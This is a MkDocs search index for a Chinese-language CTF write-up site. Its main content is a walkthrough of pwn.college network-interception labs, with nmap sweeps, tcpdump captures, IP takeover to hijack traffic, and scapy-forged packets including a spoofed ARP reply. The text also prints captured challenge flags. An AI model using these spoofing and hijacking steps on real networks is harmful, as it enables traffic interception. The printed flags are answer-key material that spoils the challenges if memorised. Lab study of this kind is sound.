{"config":{"indexing":"full","lang":["ja","en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"CTF-CLASS \u4e00\u4e2a\u5b58\u4e86\u5f88\u591aWP\u7684\u5730\u65b9 CSE365 sp23 \u5b98\u7f51\u5728 \u8fd9\u513f ,\u6211\u7684\u76ee\u5f55\u5728 \u8fd9\u513f ,\u770b\u8d77\u6765\u5f88\u5165\u95e8\u7684\u8bfe\uff0c\u6682\u65f6\u505a\u4e86\u4e00\u90e8\u5206\uff0c\u627e\u4e00\u6bb5\u65f6\u95f4\u628apwn college\u7684\u4e1c\u897f\u90fd\u505a\u5b8c\u7136\u540e\u653e\u4e0a\u6765\u3002 Talking Web Assembly Crash Course Building a Web Server Reverse Engineering Intercepting Communication Cryptography Web Security Binary Exploitation Wargame \u53d1\u73b0\u7684\u4e00\u4e2a\u5c0f\u7684 \u5b89\u5168\u7f51\u7ad9 \uff0c\u6709\u51e0\u4e2a\u7cfb\u5217\u4e5f\u633a\u5165\u95e8\uff0c\u6682\u65f6\u505a\u4e86bandit bandit Natas Leviathan Krypton Narnia Behemoth Utumno Maze Vortex Manpage Drifter FormulaOne CSE466 FALL22 Program Misuse Program Interaction Assembly Crash Course Shellcode Injection Sandboxing Debugging Refresher Reverse Engineering Memory Errors Race Conditions Kernel Security Program Exploitation System Exploitation MalwareAnalysis \u300a\u6076\u610f\u4ee3\u7801\u5206\u6790\u5b9e\u6218\u300b\u4e00\u4e66\u9605\u8bfb\u3002 CH/Lab1 CH2 CH/Lab3 CH/Lab4 CH/Lab5 CH/Lab6 CH/Lab7 CH/Lab8 CH/Lab9 CH/Lab10 CH/Lab11 CH/Lab12 CH/Lab13 CH/Lab14 CH/Lab15 CH/Lab16 CH/Lab17 CH/Lab18 CH/Lab19 CH/Lab20 CH/Lab21 TODO-LIST CSE 494 sp23 Return Oriented Programming Format String Exploits File Struct exploits Dynamic Allocator Misuse Exploitation Primitives and Memory Mastery Dynamic Allocator Exploitation Microarchitecture Exploitation","title":"ABOUT"},{"location":"#ctf-class","text":"\u4e00\u4e2a\u5b58\u4e86\u5f88\u591aWP\u7684\u5730\u65b9","title":"CTF-CLASS"},{"location":"#cse365-sp23","text":"\u5b98\u7f51\u5728 \u8fd9\u513f ,\u6211\u7684\u76ee\u5f55\u5728 \u8fd9\u513f ,\u770b\u8d77\u6765\u5f88\u5165\u95e8\u7684\u8bfe\uff0c\u6682\u65f6\u505a\u4e86\u4e00\u90e8\u5206\uff0c\u627e\u4e00\u6bb5\u65f6\u95f4\u628apwn college\u7684\u4e1c\u897f\u90fd\u505a\u5b8c\u7136\u540e\u653e\u4e0a\u6765\u3002 Talking Web Assembly Crash Course Building a Web Server Reverse Engineering Intercepting Communication Cryptography Web Security Binary Exploitation","title":"CSE365 sp23"},{"location":"#wargame","text":"\u53d1\u73b0\u7684\u4e00\u4e2a\u5c0f\u7684 \u5b89\u5168\u7f51\u7ad9 \uff0c\u6709\u51e0\u4e2a\u7cfb\u5217\u4e5f\u633a\u5165\u95e8\uff0c\u6682\u65f6\u505a\u4e86bandit bandit Natas Leviathan Krypton Narnia Behemoth Utumno Maze Vortex Manpage Drifter FormulaOne","title":"Wargame"},{"location":"#cse466-fall22","text":"Program Misuse Program Interaction Assembly Crash Course Shellcode Injection Sandboxing Debugging Refresher Reverse Engineering Memory Errors Race Conditions Kernel Security Program Exploitation System Exploitation","title":"CSE466 FALL22"},{"location":"#malwareanalysis","text":"\u300a\u6076\u610f\u4ee3\u7801\u5206\u6790\u5b9e\u6218\u300b\u4e00\u4e66\u9605\u8bfb\u3002 CH/Lab1 CH2 CH/Lab3 CH/Lab4 CH/Lab5 CH/Lab6 CH/Lab7 CH/Lab8 CH/Lab9 CH/Lab10 CH/Lab11 CH/Lab12 CH/Lab13 CH/Lab14 CH/Lab15 CH/Lab16 CH/Lab17 CH/Lab18 CH/Lab19 CH/Lab20 CH/Lab21","title":"MalwareAnalysis"},{"location":"#todo-list","text":"CSE 494 sp23 Return Oriented Programming Format String Exploits File Struct exploits Dynamic Allocator Misuse Exploitation Primitives and Memory Mastery Dynamic Allocator Exploitation Microarchitecture Exploitation","title":"TODO-LIST"},{"location":"CSE365/","text":"CSE365 sp23\uff0c\u4e0d\u5f97\u4e0d\u8bf4pwn college\u771f\u662f\u7cbe\u54c1\u7f51\u7ad9\uff0c\u9898\u76ee\u5f88\u4e30\u5bcc\uff0c\u8d28\u91cf\u4e5f\u8fd8\u4e0d\u9519\uff0c\u5165\u95e8\u3001\u8fdb\u9636\u90fd\u6709\uff0c\u800c\u4e14\u63d0\u4f9b\u7684\u9776\u573a\u975e\u5e38\u826f\u5fc3\uff01\u5728\u6211\u4e00\u5927\u901a\u778e\u641e\u4e4b\u540e\uff0c\u7a7a\u95f4\u5c45\u7136\u8fd8\u8fd9\u4e48\u5927\uff01 Filesystem Size Used Avail Use% Mounted on overlay 916G 169G 701G 20% / tmpfs 64M 0 64M 0% /dev tmpfs 126G 0 126G 0% /sys/fs/cgroup overlay 916G 169G 701G 20% /usr/sbin/docker-init /dev/loop79 982M 557M 360M 61% /home/hacker /dev/sdc2 916G 169G 701G 20% /etc/hosts shm 64M 0 64M 0% /dev/shm tmpfs 126G 0 126G 0% /proc/acpi tmpfs 126G 0 126G 0% /proc/scsi tmpfs 126G 0 126G 0% /sys/firmware \u800c\u4e14\u4e3b\u76ee\u5f55\u6301\u4e45\u4fdd\u5b58\uff0c\u771f\u662f\u7231\u4e86\uff01 \u6a21\u5757\u603b\u7ed3 talking web \u8fd9\u4e2a\u6a21\u5757\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u8ba9\u4f60\u719f\u7ec3\u4f7f\u7528curl\u3001nc\u3001python\u6765\u8fdb\u884chttp\u5305\u7684\u53d1\u9001\uff0c\u662f\u6bd4\u8f83\u57fa\u7840\u7684\u3002\u4f46\u662f\u53ef\u4ee5\u90fd\u8bb0\u5f55\u4e0b\u6765\u8fd9\u4e9b\u5185\u5bb9\uff0c\u4ee5\u4fbf\u65e5\u540e\u67e5\u9605\u3002 intercepting communication \u8fd9\u4e2a\u6a21\u5757\u6d89\u53ca\u5230\u4e86\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u56db\u5c42\u7f51\u7edc\u7ed3\u6784\uff0c\u8fd8\u7b97\u662f\u6709\u70b9\u610f\u601d\u5427\uff0c\u5927\u591a\u6570\u6240\u9700\u8981\u7684\u77e5\u8bc6\u5176\u5b9e\u5982\u679c\u5b66\u8fc7\u8ba1\u7b97\u673a\u7f51\u7edc\u8fd9\u95e8\u8bfe\u672c\u8eab\u7684\u8bdd\uff0c\u90fd\u662f\u6700\u6700\u6d45\u663e\u7684\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u6a21\u5757\u7684\u610f\u4e49\u5c31\u5728\u4e8e\u5b66\u4e60\u4e00\u4e0barp,ip,scapy\u600e\u4e48\u7528\uff0c\u770b\u770b\u8fd9\u4e9b\u77e5\u8bc6\u662f\u600e\u4e48\u5e94\u7528\u7684\uff0c\u6700\u540e\u4e00\u4e2a\u9898\u6709\u4e9b\u56f0\u96be\uff0c\u6211\u5728\u770b\u4e86\u89e3\u7b54\u4e4b\u540e\u4e5f\u662f\u95ee\u4e86\u4e00\u4e2a\u5b66\u4e86CTF\u7684\u540c\u5b66\u624d\u641e\u5b9a\uff0cG \u4e3b\u8981\u662fscapy\u7684\u5b66\u4e60\u8d44\u6599\u6709\u70b9\u513f\u5c11\uff0c\u6211\u641c\u4e86\u4e0d\u5c11\u4e5f\u6ca1\u641c\u5230\u6700\u540e\u4e00\u4e2a\u7279\u522b\u76f8\u5173\u7684\uff0c\u4e0d\u8fc7\u76f8\u4fe1\u5728\u5199\u5b8c\u8fd9\u4e9b\u6311\u6218\u4e4b\u540e\u5bf9scapy\u548c\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u7406\u89e3\u4f1a\u6709\u4e00\u5b9a\u52a0\u6df1\u7684\u3002 \u8bb2\u89e3 YOUTUBE\u4e0apwn college\u4e0a\u4f20\u4e86\u8001\u5e08\u7684\u8bb2\u89e3\uff0c\u5927\u591a\u6570\u5f88\u7ec6\u81f4\uff0c\u5c11\u90e8\u5206\u6ca1\u6709\u5b8c\u6210\u7ed9\u51fa\u8fc7\u7a0b\uff0c\u4f46\u90fd\u6709\u601d\u8def\uff0c\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u3002\u5176\u5b9e\u5728\u5b9e\u73b0\u4e86\u4e4b\u540e\u53d1\u73b0\u4e5f\u5c31\u662f\u8fd9\u4e48\u56de\u4e8b\u513f\uff0c\u4f46\u662f\u601d\u8003\u7684\u8fc7\u7a0b\u6709\u65f6\u5019\u662f\u75db\u82e6\u7684\u3002 \u53cb\u94fe \u53e6\u4e00\u4f4d\u641e\u5b89\u5168\u7684\u76c6\u53cb\u7684 \u535a\u5ba2","title":"ABOUT CSE365"},{"location":"CSE365/#cse365","text":"sp23\uff0c\u4e0d\u5f97\u4e0d\u8bf4pwn college\u771f\u662f\u7cbe\u54c1\u7f51\u7ad9\uff0c\u9898\u76ee\u5f88\u4e30\u5bcc\uff0c\u8d28\u91cf\u4e5f\u8fd8\u4e0d\u9519\uff0c\u5165\u95e8\u3001\u8fdb\u9636\u90fd\u6709\uff0c\u800c\u4e14\u63d0\u4f9b\u7684\u9776\u573a\u975e\u5e38\u826f\u5fc3\uff01\u5728\u6211\u4e00\u5927\u901a\u778e\u641e\u4e4b\u540e\uff0c\u7a7a\u95f4\u5c45\u7136\u8fd8\u8fd9\u4e48\u5927\uff01 Filesystem Size Used Avail Use% Mounted on overlay 916G 169G 701G 20% / tmpfs 64M 0 64M 0% /dev tmpfs 126G 0 126G 0% /sys/fs/cgroup overlay 916G 169G 701G 20% /usr/sbin/docker-init /dev/loop79 982M 557M 360M 61% /home/hacker /dev/sdc2 916G 169G 701G 20% /etc/hosts shm 64M 0 64M 0% /dev/shm tmpfs 126G 0 126G 0% /proc/acpi tmpfs 126G 0 126G 0% /proc/scsi tmpfs 126G 0 126G 0% /sys/firmware \u800c\u4e14\u4e3b\u76ee\u5f55\u6301\u4e45\u4fdd\u5b58\uff0c\u771f\u662f\u7231\u4e86\uff01","title":"CSE365"},{"location":"CSE365/#_1","text":"","title":"\u6a21\u5757\u603b\u7ed3"},{"location":"CSE365/#talking-web","text":"\u8fd9\u4e2a\u6a21\u5757\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u8ba9\u4f60\u719f\u7ec3\u4f7f\u7528curl\u3001nc\u3001python\u6765\u8fdb\u884chttp\u5305\u7684\u53d1\u9001\uff0c\u662f\u6bd4\u8f83\u57fa\u7840\u7684\u3002\u4f46\u662f\u53ef\u4ee5\u90fd\u8bb0\u5f55\u4e0b\u6765\u8fd9\u4e9b\u5185\u5bb9\uff0c\u4ee5\u4fbf\u65e5\u540e\u67e5\u9605\u3002","title":"talking web"},{"location":"CSE365/#intercepting-communication","text":"\u8fd9\u4e2a\u6a21\u5757\u6d89\u53ca\u5230\u4e86\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u56db\u5c42\u7f51\u7edc\u7ed3\u6784\uff0c\u8fd8\u7b97\u662f\u6709\u70b9\u610f\u601d\u5427\uff0c\u5927\u591a\u6570\u6240\u9700\u8981\u7684\u77e5\u8bc6\u5176\u5b9e\u5982\u679c\u5b66\u8fc7\u8ba1\u7b97\u673a\u7f51\u7edc\u8fd9\u95e8\u8bfe\u672c\u8eab\u7684\u8bdd\uff0c\u90fd\u662f\u6700\u6700\u6d45\u663e\u7684\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u6a21\u5757\u7684\u610f\u4e49\u5c31\u5728\u4e8e\u5b66\u4e60\u4e00\u4e0barp,ip,scapy\u600e\u4e48\u7528\uff0c\u770b\u770b\u8fd9\u4e9b\u77e5\u8bc6\u662f\u600e\u4e48\u5e94\u7528\u7684\uff0c\u6700\u540e\u4e00\u4e2a\u9898\u6709\u4e9b\u56f0\u96be\uff0c\u6211\u5728\u770b\u4e86\u89e3\u7b54\u4e4b\u540e\u4e5f\u662f\u95ee\u4e86\u4e00\u4e2a\u5b66\u4e86CTF\u7684\u540c\u5b66\u624d\u641e\u5b9a\uff0cG \u4e3b\u8981\u662fscapy\u7684\u5b66\u4e60\u8d44\u6599\u6709\u70b9\u513f\u5c11\uff0c\u6211\u641c\u4e86\u4e0d\u5c11\u4e5f\u6ca1\u641c\u5230\u6700\u540e\u4e00\u4e2a\u7279\u522b\u76f8\u5173\u7684\uff0c\u4e0d\u8fc7\u76f8\u4fe1\u5728\u5199\u5b8c\u8fd9\u4e9b\u6311\u6218\u4e4b\u540e\u5bf9scapy\u548c\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u7406\u89e3\u4f1a\u6709\u4e00\u5b9a\u52a0\u6df1\u7684\u3002","title":"intercepting communication"},{"location":"CSE365/#_2","text":"YOUTUBE\u4e0apwn college\u4e0a\u4f20\u4e86\u8001\u5e08\u7684\u8bb2\u89e3\uff0c\u5927\u591a\u6570\u5f88\u7ec6\u81f4\uff0c\u5c11\u90e8\u5206\u6ca1\u6709\u5b8c\u6210\u7ed9\u51fa\u8fc7\u7a0b\uff0c\u4f46\u90fd\u6709\u601d\u8def\uff0c\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u3002\u5176\u5b9e\u5728\u5b9e\u73b0\u4e86\u4e4b\u540e\u53d1\u73b0\u4e5f\u5c31\u662f\u8fd9\u4e48\u56de\u4e8b\u513f\uff0c\u4f46\u662f\u601d\u8003\u7684\u8fc7\u7a0b\u6709\u65f6\u5019\u662f\u75db\u82e6\u7684\u3002","title":"\u8bb2\u89e3"},{"location":"CSE365/#_3","text":"\u53e6\u4e00\u4f4d\u641e\u5b89\u5168\u7684\u76c6\u53cb\u7684 \u535a\u5ba2","title":"\u53cb\u94fe"},{"location":"CSE365/Intercepting%20Communication/","text":"Knowledge \u8fd9\u4e00\u90e8\u5206\u662f\u4e00\u4e2a\u6781\u7b80\u7248\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u77e5\u8bc6\u3002 \u5927\u6982\u610f\u601d\u662f\u4f60\u9700\u8981\u5efa\u7acb\u4e00\u4e2a\u56db\u5c42\u7f51\u7edc\u6a21\u578b\u7684\u6982\u5ff5\uff0c\u7136\u540e\u5efa\u7acb\u8d77\u6bcf\u4e00\u5c42\u6240\u4f7f\u7528\u7684\u534f\u8bae\u548c\u6570\u636e\u5305\u90fd\u662f\u4ec0\u4e48 \u4ece\u4e0b\u5f80\u4e0a\u4f9d\u6b21\u662f\u8fd9\u6837\u7684\uff1a HTTP---\u5b9e\u73b0\u529f\u80fd TCP---\u8bc6\u522b\u8fdb\u7a0b IP---\u8bc6\u522b\u4e3b\u673a ARP(ETHER)---\u7269\u7406\u7f51\u5361 \u7136\u540e\u672c\u90e8\u5206\u5c31\u662f\u7814\u7a76\u4ee5\u8fd9\u4e9b\u5305\u4e3a\u57fa\u7840\u5efa\u7acb\u8d77\u7684\u901a\u8baf\u7684\u4e00\u4e9b\u8fc7\u7a0b\u3002 \u5b9e\u7528\u5de5\u5177scapy \u53d1\u5305\u53ef\u4ee5\u770b \u8fd9\u4e2a level14\u9700\u8981\u4f7f\u7528sniff \u5176\u4ed6 tcpdump\u5df2\u7ecf\u8db3\u591f\u597d\u7528\u4e86\uff0cwireshark\u662f\u66f4\u5f3a\u5927\u7684\u56fe\u5f62\u5316\u5de5\u5177\uff0c\u53ea\u4e0d\u8fc7\u6211\u8fde\u90a3\u4e2a\u5b9e\u9a8c\u73af\u5883\u603b\u662f\u5f88\u5361\uff0c\u6240\u4ee5\u6700\u540e\u90fd\u91c7\u53d6\u547d\u4ee4\u884c\u4e86\u3002 WP level1 Connect to a remote host nc 10.0.0.3 31337 level2 Listen for a connection from a remote host nc -l 31337 level3 Find and connect to a remote host # \u626b\u63cf\u7aef\u53e3nmap -p 31337 10.0.0.0/24 root@ip-10-0-0-2:~# nmap -p 31337 10.0.0.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 22:54 UTC Nmap scan report for 10.0.0.47 Host is up (0.000090s latency). PORT STATE SERVICE 31337/tcp open Elite MAC Address: 1A:78:B6:5A:08:A8 (Unknown) Nmap scan report for 10.0.0.2 Host is up (0.000058s latency). PORT STATE SERVICE 31337/tcp closed Elite Nmap done: 256 IP addresses (2 hosts up) scanned in 28.46 seconds root@ip-10-0-0-2:~# nc 10.0.0.2 31337 root@ip-10-0-0-2:~# nc 10.0.0.47 31337 # \u51fa\u73b0flag level4 Find and connect to a remote host on a large network root@ip-10-0-0-2:~# nmap -p 31337 -T5 10.0.0.0/16 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 23:44 UTC Nmap scan report for 10.0.0.2 Host is up (0.000053s latency). PORT STATE SERVICE 31337/tcp closed Elite Nmap scan report for 10.0.211.92 Host is up (0.000093s latency). PORT STATE SERVICE 31337/tcp open Elite MAC Address: D6:5F:9A:28:AE:26 (Unknown) Nmap done: 65536 IP addresses (2 hosts up) scanned in 2583.60 seconds # \u8fd9\u4e2a\u6211\u6ca1\u5565\u597d\u529e\u6cd5\uff0c\u611f\u89c9\u65f6\u95f4\u5f88\u957f\u554a\u3002 nc 10.0.211.92 31337 level5 Monitor traffic from a remote host tcpdump -i any port 31337 # \u5148\u8fd9\u6837\u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u5305\u662f\u91cd\u590d\u7684\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u6570\u636e\u5305\u957f\u5ea6\u4e3a58\uff0c\u63a8\u6d4b\u6709\u7528 tcpdump -i any port 31337 -X # \u8fd9\u4f1a\u8f93\u51fa\u5177\u4f53\u7684\u5341\u516d\u8fdb\u5236\u548cascii\u7801 # \u7136\u540e\u5c31\u5f97\u5230\u4e86\u5177\u4f53\u7684\u5305\u4e86 01:10:28.660067 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.50004: Flags [P.], seq 1:59, ack 60, win 509, options [nop,nop,TS val 4114781018 ecr 1191307187], length 58 0x0000: 4500 006e 4d18 4000 4006 d96d 0a00 0002 E..nM.@.@..m.... 0x0010: 0a00 0003 7a69 c354 b6ab 89fa 61ea 4259 ....zi.T....a.BY 0x0020: 8018 01fd c37f 0000 0101 080a f542 935a .............B.Z 0x0030: 4701 e7b3 7077 6e2e 636f 6c6c 6567 657b G...pwn.college{ 0x0040: 5934 4a50 5173 526d 4367 4e71 636a 6e69 Y4JPQsRmCgNqcjni 0x0050: 6532 3878 7775 4961 5755 4e2e 644e 6a4e e28xwuIaWUN.dNjN 0x0060: 7a4d 444c 3251 6a4d 794d 7a57 7d0a zMDL2QjMyMzW}. level6 Monitor slow traffic from a remote host # \u8001\u89c4\u77e9\u5148\u770b\u4e00\u4e0b tcpdump -i any port 31337 # \u8fd9\u4e2a\u9898\u4e5f\u6bd4\u8f83\u6c34\u4e86\uff0c\u5c31\u662f\u6bcf\u4e2a\u5305\u53ea\u53d1\u9001\u5176\u4e2d\u7684\u4e00\u4f4d\uff0c\u7136\u540e\u4f60\u7b4958\u4e2a\u5305\uff0c\u5c31\u51d1\u9f50\u4e86\u3002 tcpdump -i any port 31337 and src 10.0.0.2 and dst 10.0.0.3 and greater 1 -X \u7136\u540e\u8f93\u51fa\u5927\u6982\u662f\u8fd9\u6837\u7684 01:32:10.535829 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 5:6, ack 6, win 510, options [nop,nop,TS val 4116082894 ecr 1192609080], length 1 0x0000: 4500 0035 9482 4000 4006 923c 0a00 0002 E..5..@.@..<.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8af feb5 c987 ....zi.j........ 0x0020: 8018 01fe eab4 0000 0101 080a f556 70ce .............Vp. 0x0030: 4715 c538 63 G..8c 01:32:11.537097 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 6:7, ack 7, win 510, options [nop,nop,TS val 4116083896 ecr 1192610081], length 1 0x0000: 4500 0035 9483 4000 4006 923b 0a00 0002 E..5..@.@..;.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b0 feb5 c988 ....zi.j........ 0x0020: 8018 01fe d6df 0000 0101 080a f556 74b8 .............Vt. 0x0030: 4715 c921 6f G..!o 01:32:12.538387 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 7:8, ack 8, win 510, options [nop,nop,TS val 4116084897 ecr 1192611083], length 1 0x0000: 4500 0035 9484 4000 4006 923a 0a00 0002 E..5..@.@..:.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b1 feb5 c989 ....zi.j........ 0x0020: 8018 01fe d20a 0000 0101 080a f556 78a1 .............Vx. 0x0030: 4715 cd0b 6c G...l 01:32:13.539649 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 8:9, ack 9, win 510, options [nop,nop,TS val 4116085898 ecr 1192612084], length 1 0x0000: 4500 0035 9485 4000 4006 9239 0a00 0002 E..5..@.@..9.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b2 feb5 c98a ....zi.j........ 0x0020: 8018 01fe ca36 0000 0101 080a f556 7c8a .....6.......V|. 0x0030: 4715 d0f4 6c G...l 01:32:14.540780 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 9:10, ack 10, win 510, options [nop,nop,TS val 4116086899 ecr 1192613085], length 1 0x0000: 4500 0035 9486 4000 4006 9238 0a00 0002 E..5..@.@..8.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b3 feb5 c98b ....zi.j........ 0x0020: 8018 01fe c962 0000 0101 080a f556 8073 .....b.......V.s 0x0030: 4715 d4dd 65 G...e 01:32:15.541382 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 10:11, ack 11, win 510, options [nop,nop,TS val 4116087900 ecr 1192614086], length 1 0x0000: 4500 0035 9487 4000 4006 9237 0a00 0002 E..5..@.@..7.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b4 feb5 c98c ....zi.j........ 0x0020: 8018 01fe bf8e 0000 0101 080a f556 845c .............V.\\ 0x0030: 4715 d8c6 67 G...g 01:32:16.542597 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 11:12, ack 12, win 510, options [nop,nop,TS val 4116088901 ecr 1192615087], length 1 0x0000: 4500 0035 9488 4000 4006 9236 0a00 0002 E..5..@.@..6.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b5 feb5 c98d ....zi.j........ 0x0020: 8018 01fe b9ba 0000 0101 080a f556 8845 .............V.E 0x0030: 4715 dcaf 65 G...e \u6211\u4eec\u5c31\u628a\u6700\u540e\u4e00\u4f4d\u62fc\u8d77\u6765\u5c31\u884c\u4e86\uff0c\u53cd\u6b63\u8fd9\u4e00\u6b65\u5927\u6982\u6709\u70b9\u513f\u70e6\uff0c\u53ef\u4ee5\u5199\u811a\u672c\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u624b\u52a8\u590d\u5236:( # \u597d\u5427\uff0c\u6211\u811a\u672c\u6ca1\u5199\u5bf9\uff0c\u81ea\u5df1\u624b\u52a8\u590d\u5236\u7684\uff0c\u5c3c\u739b pwn.college{kNJHOFI1VRpp7QOATsbMSjGQiQp.dRjNzMDL2QjMyMzW} level7 Hijack traffic from a remote host by configuring your network interface tcpdump -i any # \u53d1\u73b010.0.0.4\u4e00\u76f4\u5728\u53d1\u9001\u8bf7\u6c42\u3002\u8fd9\u65f6\u5019\u6211\u9a97\u5b83\u5e94\u8be5\u5c31\u884c\u4e86\u3002 ip addr add 10.0.0.2/8 dev eth0 \u7136\u540e\u53d1\u73b0\u4e86\u8fd9\u4e9b\u5305 listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes 15:07:21.562729 eth0 B ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28 15:07:21.562752 eth0 Out ARP, Reply 10.0.0.2 is-at fa:9a:ce:e8:ef:b2 (oui Unknown), length 28 15:07:21.562833 eth0 In IP 10.0.0.4.37984 > 10.0.0.2.31337: Flags [S], seq 1279607758, win 64240, options [mss 1460,sackOK,TS val 1986706165 ecr 0,nop,wscale 7], length 0 15:07:21.562843 eth0 Out IP 10.0.0.2.31337 > 10.0.0.4.37984: Flags [R.], seq 0, ack 1279607759, win 0, length 0 15:07:21.639815 lo In IP localhost.53883 > 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39) 15:07:21.639846 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.639911 lo In IP localhost.39242 > 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39) 15:07:21.639923 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.640042 lo In IP localhost.46035 > 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39) 15:07:21.640052 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.640103 lo In IP localhost.50224 > 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39) \u8fd9\u4e2aR\u8bf4\u660ereset\u4f4d\uff1a\u200b\u200b\u200b\u200b\u200b\u200b \u8868\u793aTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u5f02\u5e38\u5fc5\u987b\u5f3a\u5236\u65ad\u5f00\u8fde\u63a5\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u6ca1\u6709\u88ab\u4f7f\u7528\u7684\u7aef\u53e3\u5373\u4f7f\u53d1\u6765\u4e86\u8fde\u63a5\u8bf7\u6c42\uff0c\u4e5f\u65e0\u6cd5\u901a\u4fe1\u3002 \u7136\u540e\u76d1\u542c\u5373\u53ef nc -l 31337 \u8fd9\u9898\u770b\u4e86\u8bb2\u89e3\u624d\u4f1a\uff0c\u5c31\u5361\u5728\u4e0d\u77e5\u9053\u600e\u4e48\u770b\u8fd9\u4e2a\u6807\u5fd7\u4f4d\u4e0a\uff0c\u679c\u7136\u77e5\u8bc6\u5904\u5904\u662f\u76f2\u533a \u7136\u540e\u5728\u4f60\u76d1\u542c\u4ee5\u540e\uff0c\u5c31\u4f1a\u53d8\u6210PUSH\u6807\u5fd7\u4f4d\u3002 ///@TODO: \u5173\u4e8e\u540e\u9762\u7684\u53d1\u5305\uff0c\u6211\u6240\u6709ARP\u5565\u7684\u57fa\u672c\u4e0a\u90fd\u662f\u53d1\u9001\u7684\u5e7f\u64ad\u5730\u5740\uff0c\u8bb2\u89e3\u4e4b\u4e2d\u53d1\u9001\u7ed9\u7279\u5b9a\u5730\u5740\uff0c\u6ca1\u6709\u5fc5\u8981\uff0c\u800c\u4e14\u7531\u4e8e\u6211\u6709\u7684\u5173\u5361\u4f4f\uff0c\u5982\u679c\u53d1\u9001\u7ed9\u7279\u5b9a\u7684\u7269\u7406\u7f51\u5361\uff0c\u6211\u6bcf\u6b21\u91cd\u5f00\u6311\u6218\u90fd\u8981\u91cd\u65b0\u67e5\u770b\uff0c\u6709\u70b9\u513f\u9ebb\u70e6\u3002 level8 Manually send an Ethernet packet \u4e3b\u8981\u662f\u4f7f\u7528scapy >>> sendp(Ether(src=\"4a:b3:c7:c5:08:7d\",dst=\"ff:ff:ff:ff:ff:ff\",type=0xFFFF),iface=\"eth0\") . Sent 1 packets. pwn.college{wl9Wr84duLuF_XsCsoo6EiqhnU3.dZjNzMDL2QjMyMzW} level9 Manually send an Internet Protocol packet \u53d1IP\u4e86 >>> sendp(Ether(src=\"52:bc:a3:08:14:d1\",dst=\"ff:ff:ff:ff:ff:ff\", type=0x0800) / IP(proto=0xFF, src=\"127.0.0.1\",dst=\"10.0.0.3\"), iface=\"eth0\") . Sent 1 packets. pwn.college{c5HrfavanBMm_0po-E47NuCoY2J.ddjNzMDL2QjMyMzW} level10 Manually send a Transmission Control Protocol packet >>> sendp(Ether(src=\"12:af:41:92:01:6f\",dst=\"ff:ff:ff:ff:ff:ff\", type=0x0800) / IP(src=\"127.0.0.1\", dst=\"10.0.0.3\", proto=0x06) / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags=\"APRSF\"), ...: iface=\"eth0\") . Sent 1 packets. pwn.college{gSJcnHgB4dNz17jCCuEduVjMEF_.dhjNzMDL2QjMyMzW} level11 Manually perform a Transmission Control Protocol handshake sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, seq=31337, flags=\"S\"),iface=\"eth0\") sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, ack=1235161237, seq=31338,flags=\"A\"),iface=\"eth0\") pwn.college{cMG0JWm3rTQmJHtfC-JNorRv6Ef.dljNzMDL2QjMyMzW} \u591a\u4e48\u7f8e\u5999\u7684\u4e00\u5f20\u56fe level12 Manually send an Address Resolution Protocol packet >>> sendp(Ether(dst=\"ff:ff:ff:ff:ff:ff\", src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\", hwsrc=get_if_h ...: waddr(\"eth0\"), psrc=\"10.0.0.2\", hwdst=\"ff:ff:ff:ff:ff:ff\", pdst=\"10.0.0.3\"), iface=\"eth0\") . Sent 1 packets. 